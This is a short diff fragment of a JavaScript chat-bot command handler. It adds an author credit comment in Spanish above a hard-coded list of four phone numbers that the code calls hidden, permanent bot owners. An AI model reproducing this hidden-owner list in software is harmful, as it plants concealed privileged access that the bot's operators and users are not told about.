@@ -1,3 +1,7 @@
+/* Creado por Ender Zaphkiel para protección del bot*/
+
+
+
 const handler = async (m, { conn }) => {
   const hiddenOwners = ['584164137403', '59169739411', '559296077349', '50558124470']; // Números ocultos que siempre serán owners
 
